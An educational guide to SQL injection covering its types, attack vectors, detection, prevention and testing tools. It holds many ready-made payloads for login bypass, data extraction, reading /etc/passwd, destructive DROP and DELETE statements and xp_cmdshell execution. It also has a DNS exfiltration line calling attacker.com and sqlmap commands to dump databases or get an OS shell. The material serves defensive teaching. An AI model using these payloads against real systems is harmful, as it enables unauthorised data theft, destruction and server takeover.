# SQL Injection (SQLi) - Complete Guide

> A comprehensive guide to understanding SQL Injection vulnerabilities, combining insights from **OWASP**, **PortSwigger**, **HackTricks**, and industry best practices.

---

## Table of Contents
1. [What is SQL Injection?](#what-is-sql-injection)
2. [How It Works](#how-it-works)
3. [Types of SQL Injection](#types-of-sql-injection)
4. [Common Attack Vectors](#common-attack-vectors)
5. [Real-World Examples](#real-world-examples)
6. [Detection & Testing](#detection--testing)
7. [Prevention & Mitigation](#prevention--mitigation)
8. [Tools for Testing](#tools-for-testing)
9. [References](#references)

---

## What is SQL Injection?

**SQL Injection (SQLi)** is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It occurs when user input is **improperly included** in an SQL statement without proper sanitization or parameterization.

### Why is it Critical?

According to **OWASP**, SQL Injection is consistently ranked in the **OWASP Top 10** web vulnerabilities due to its severity. An attacker can:

- ✗ View sensitive data (usernames, passwords, credit cards, PII)
- ✗ Modify or delete database records
- ✗ Authenticate as other users or administrators
- ✗ Execute administrative operations on the database
- ✗ Issue commands to the underlying operating system
- ✗ Potentially take full control of the application and server

### Attack Surface

SQL injection vulnerabilities typically occur in:
- Login forms (username/password fields)
- Search bars and filters
- URL parameters and query strings
- POST request bodies
- HTTP headers (less common but possible)
- Any user-controlled input that gets passed to a database query

---

## How It Works

### Basic Example

**Vulnerable Code (Python):**
```python
# VULNERABLE - DO NOT USE
username = request.args.get('username')
password = request.args.get('password')
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
result = db.execute(query)
```

**Normal Input:**
```
username = admin
password = password123
```
Results in:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
```

**Malicious Input (SQLi Attack):**
```
username = admin' --
password = anything
```
Results in:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

The `--` comments out the rest of the query, so the password check is bypassed. The attacker logs in as admin without knowing the password!

### Attack Flow

```
┌─────────────────────────────────────────────────────────┐
│ Attacker injects malicious SQL syntax into input fields │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ Application fails to sanitize/validate input            │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ Malicious SQL is concatenated into query string         │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ Modified query executes on the database                 │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ Attacker extracts data, modifies records, or execapes   │
└─────────────────────────────────────────────────────────┘
```

---

## Types of SQL Injection

### 1. **In-Band SQLi** (Results Visible in Response)

#### A. Error-Based SQLi
Database error messages are returned to the user, revealing database structure and information.

**Example:**
```sql
' UNION SELECT NULL, @@version, NULL, NULL --
```

**What Attacker Gets:**
- Database version and type
- Table names and structure
- Column names
- Detailed error messages

**Difficulty:** Easy
**Detection:** Visual feedback from errors

---

#### B. Union-Based SQLi
Uses the `UNION` operator to append attacker's query results to the original query.

**Example:**
```
Username: ' UNION SELECT username, password, email, NULL FROM users --
Password: anything
```

**What Attacker Gets:**
- Direct data extraction from any table
- Access to all columns and rows
- Combined with original query results

**Difficulty:** Easy to Medium
**Detection:** Direct observation of injected data in response

---

### 2. **Blind SQLi** (Results Not Visible)

#### A. Boolean-Based Blind SQLi
Application behavior changes based on TRUE/FALSE conditions, even though errors/data aren't displayed.

**Example:**
```
Username: admin' AND 1=1 --  (Page loads normally)
Username: admin' AND 1=2 --  (Page shows error or different content)
```

Attacker infers information by observing differences:
- Presence/absence of content
- Page load times
- HTTP status codes
- Custom error messages

**Extraction Process:**
```sql
-- Check if first character of password is 'a'
' AND SUBSTRING(password, 1, 1) = 'a' --

-- Binary search through character set
' AND SUBSTRING(password, 1, 1) > 'm' --
```

**Difficulty:** Medium to Hard
**Time:** Very slow (character by character extraction)

---

#### B. Time-Based Blind SQLi
Uses database delays to infer information when no visual feedback is available.

**Example (MySQL):**
```sql
' AND IF(1=1, SLEEP(5), 0) --
```

**How it works:**
- If condition is TRUE: Database sleeps for 5 seconds
- If condition is FALSE: Query executes immediately

Attacker measures response time to determine TRUE/FALSE:
```sql
' AND IF(SUBSTRING(password, 1, 1) = 'a', SLEEP(5), 0) --
```

**Difficulty:** Hard
**Time:** Very slow (requires many requests)

---

### 3. **Out-of-Band SQLi** (Data via Different Channel)

Attacker retrieves data through a different communication channel (DNS queries, HTTP requests, etc.) instead of the application's response.

**Example (SQL Server):**
```sql
'; EXEC xp_cmdshell 'nslookup '+@@version+'.attacker.com' --
```

**Use Cases:**
- When both In-Band and Blind SQLi are not possible
- Exfiltrating large amounts of data
- Bypassing WAF/IDS

**Difficulty:** Very Hard
**Requirements:** Out-of-band channel setup (DNS server, HTTP callback)

---

## Common Attack Vectors

### 1. Authentication Bypass
```sql
Username: admin' --
Password: anything

-- Becomes: SELECT * FROM users WHERE username = 'admin' -- AND password = 'anything'
-- Result: Logs in as admin without password
```

### 2. Data Extraction (UNION-Based)
```sql
Username: ' UNION SELECT username, password, email, credit_card FROM users --
Password: anything

-- Extracts all user data including credit cards
```

### 3. Database Enumeration
```sql
-- Check database version
' UNION SELECT @@version, NULL, NULL, NULL --

-- Check current user
' UNION SELECT USER(), NULL, NULL, NULL --

-- List all tables
' UNION SELECT table_name FROM information_schema.tables --
```

### 4. Data Modification
```sql
'; UPDATE users SET role = 'admin' WHERE username = 'attacker' --
'; DELETE FROM orders WHERE customer_id = 123 --
'; INSERT INTO users VALUES ('hacker', 'password', 'admin') --
```

### 5. File Reading (MySQL)
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL, NULL --
' UNION SELECT GROUP_CONCAT(LOAD_FILE('/etc/passwd')), NULL, NULL, NULL --
```

### 6. File Writing (MySQL)
```sql
'; INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3f3e --
```

### 7. Remote Code Execution (SQL Server)
```sql
'; EXEC xp_cmdshell 'whoami' --
'; EXEC sp_OACreate 'WScript.Shell' --
```

---

## Real-World Examples

### Example 1: Simple Login Bypass

**Vulnerable Code:**
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Attack:**
```
Username: admin' --
Password: (anything)
```

**Modified Query:**
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
```

**Result:** Attacker logs in as admin without knowing the password

---

### Example 2: Data Extraction via UNION

**Original Query:**
```sql
SELECT id, product_name, price FROM products WHERE category = 'electronics'
```

**Attack Input:**
```
category = electronics' UNION SELECT username, password, email FROM users --
```

**Modified Query:**
```sql
SELECT id, product_name, price FROM products WHERE category = 'electronics' 
UNION SELECT username, password, email FROM users --
```

**Result:** Attacker gets all usernames, passwords, and emails displayed on the page

---

### Example 3: Blind SQLi (Time-Based)

**Original Query:**
```sql
SELECT * FROM users WHERE username = 'admin'
```

**Attack:** (Checking if first character of password is 'a')
```
Username: admin' AND IF(SUBSTRING(password, 1, 1) = 'a', SLEEP(5), 0) --
```

**Expected Behavior:**
- If password starts with 'a': Page takes 5+ seconds to load
- If password doesn't start with 'a': Page loads immediately

Attacker repeats this process for each character to extract the entire password.

---

## Detection & Testing

### Manual Testing Steps

1. **Identify Input Fields**
   - Login forms, search bars, filters, URL parameters
   - Any user-controlled input going to the database

2. **Test with SQLi Payloads**
   ```sql
   ' OR 1=1 --
   ' OR '1'='1
   '; DROP TABLE users; --
   ' UNION SELECT NULL, NULL, NULL --
   ```

3. **Observe Responses**
   - Database errors (Error-based)
   - Unexpected data in response (In-band)
   - Page behavior changes (Boolean-based)
   - Response time delays (Time-based)

### Indicators of Vulnerability

- ✗ Database error messages displayed to users
- ✗ Query results change based on TRUE/FALSE conditions
- ✗ Unusual response times or page behavior
- ✗ Application crashes or hangs
- ✗ Error logs showing SQL syntax errors

### Testing Payloads

**Basic Detection:**
```sql
' OR 1=1 --
' OR 'a'='a
admin' --
' UNION SELECT NULL --
```

**Database-Specific:**

**MySQL:**
```sql
' UNION SELECT @@version, USER(), DATABASE() --
' UNION SELECT LOAD_FILE('/etc/passwd') --
```

**PostgreSQL:**
```sql
' UNION SELECT version() --
' UNION SELECT current_database() --
```

**SQL Server:**
```sql
' UNION SELECT @@version --
' UNION SELECT USER_NAME() --
```

**Oracle:**
```sql
' UNION SELECT banner FROM v$version --
' UNION SELECT name FROM v$database --
```

---

## Prevention & Mitigation

### 1. **Parameterized Queries (Prepared Statements)** ⭐ BEST

**Vulnerable Code:**
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
result = db.execute(query)
```

**Secure Code (Python):**
```python
query = "SELECT * FROM users WHERE username = ? AND password = ?"
result = db.execute(query, (username, password))
```

**Secure Code (PHP):**
```php
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

**Why It Works:**
- Input is treated as **data**, not SQL code
- SQL structure is defined before input is added
- Database driver handles escaping automatically
- Attacker cannot modify query logic

---

### 2. **Input Validation**

**Whitelist Approach (Recommended):**
```python
import re

def validate_username(username):
    # Only allow alphanumeric and underscore, 3-20 characters
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username

def validate_email(email):
    # Use email validation regex
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        raise ValueError("Invalid email")
    return email
```

**Blacklist Approach (Not Recommended):**
```python
# Blocks known bad characters - but attackers can bypass this
forbidden_chars = ["'", '"', ";", "--", "/*", "*/"]
for char in forbidden_chars:
    if char in user_input:
        raise ValueError("Invalid character")
```

---

### 3. **Input Escaping** (Less Secure, Use as Secondary)

**Not a primary defense, but helpful:**

```python
# MySQL escaping
def escape_string(s):
    return s.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"')

# Better: Use parameterized queries instead
```

---

### 4. **Principle of Least Privilege**

Database user should have **minimum necessary permissions:**

```sql
-- Create a restricted database user for the application
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'secure_password';

-- Grant only SELECT, INSERT, UPDATE on specific tables
GRANT SELECT, INSERT, UPDATE ON myapp.products TO 'app_user'@'localhost';
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'app_user'@'localhost';

-- Explicitly DENY dangerous operations
REVOKE DELETE, DROP, ALTER, CREATE ON *.* FROM 'app_user'@'localhost';
REVOKE FILE, SUPER, PROCESS ON *.* FROM 'app_user'@'localhost';
```

**Benefits:**
- Even if SQLi succeeds, attacker's permissions are limited
- Cannot delete entire tables
- Cannot read system files
- Cannot execute system commands

---

### 5. **Web Application Firewall (WAF)**

Deploy a WAF to detect and block SQLi attempts:
- OWASP ModSecurity
- AWS WAF
- Cloudflare WAF
- Imperva WAF

**Example ModSecurity Rule:**
```
SecRule ARGS|HEADERS "@contains ' OR '" \
    "id:1000,phase:2,block,msg:'SQL Injection Attack Detected'"
```

---

### 6. **Error Handling**

**Never show database errors to users:**

```python
# VULNERABLE
try:
    result = db.execute(query)
except Exception as e:
    return f"Database Error: {e}"  # Shows sensitive info!

# SECURE
try:
    result = db.execute(query)
except Exception as e:
    logger.error(f"Database Error: {e}")  # Log only
    return "An error occurred. Please try again."  # Generic response
```

---

### 7. **Security Testing**

- Regular **penetration testing** of applications
- **Code reviews** focusing on database interactions
- **Static application security testing (SAST)** tools
- **Dynamic application security testing (DAST)** tools
- Automated scanning in CI/CD pipelines

---

## Tools for Testing

### Manual Testing & Exploitation

| Tool | Purpose | Website |
|------|---------|---------|
| **sqlmap** | Automated SQLi detection and exploitation | http://sqlmap.org/ |
| **Burp Suite** | Web security testing platform | https://portswigger.net/burp |
| **OWASP ZAP** | Open-source web scanner | https://www.zaproxy.org/ |
| **SQLninja** | SQL Server fingerprinting and exploitation | http://sqlninja.sourceforge.net/ |
| **NoSQLmap** | NoSQL injection testing | https://github.com/codingo/NoSQLMap |

### Automated Scanning

| Tool | Purpose |
|------|---------|
| **SonarQube** | Static code analysis (SAST) |
| **Checkmarx** | Application security testing |
| **Fortify** | Source code security analyzer |
| **Snyk** | Dependency and vulnerability scanner |

### Example: Using sqlmap

```bash
# Basic usage - scan URL for SQLi vulnerabilities
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Dump all databases
sqlmap -u "http://target.com/page.php?id=1" --dbs --dump

# Specific database and table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# Check for file read vulnerability
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# OS shell access attempt
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

---

## References

### Official Documentation

1. **OWASP SQL Injection**
   - https://owasp.org/www-community/attacks/SQL_Injection
   - https://owasp.org/www-community/attacks/SQL_Injection/Blind_SQL_Injection

2. **PortSwigger Web Security Academy**
   - https://portswigger.net/web-security/sql-injection
   - https://portswigger.net/web-security/sql-injection/lab-default

3. **HackTricks SQL Injection Guide**
   - https://book.hacktricks.xyz/pentesting-web/sql-injection

4. **OWASP Top 10**
   - https://owasp.org/www-project-top-ten/

### Learning Resources

- **PortSwigger Labs** - Free interactive SQL injection labs
- **HackTheBox** - Hands-on hacking challenges
- **TryHackMe** - Interactive security training
- **DVWA** (Damn Vulnerable Web Application) - Practice environment

### Standards & Best Practices

- **CWE-89: Improper Neutralization of Special Elements used in an SQL Command**
  - https://cwe.mitre.org/data/definitions/89.html

- **SANS Top 25** - SQL Injection consistently ranked
  - https://www.sans.org/top25-software-errors/

---

## Summary

| Aspect | Key Point |
|--------|-----------|
| **What** | Attackers inject SQL code through user input |
| **Why** | Lack of input validation and parameterization |
| **Impact** | Data theft, modification, deletion, RCE |
| **Types** | In-band, Blind (Boolean/Time), Out-of-band |
| **Best Defense** | Parameterized queries (prepared statements) |
| **Secondary** | Input validation, least privilege, error handling |
| **Testing** | Manual testing, automated tools (sqlmap, Burp Suite) |

---

**Last Updated:** 2024
**Sources:** OWASP, PortSwigger, HackTricks, Industry Best Practices

**⚠️ Disclaimer:** This guide is for educational purposes only. Unauthorized access to computer systems is illegal. Always get proper authorization before testing for vulnerabilities.
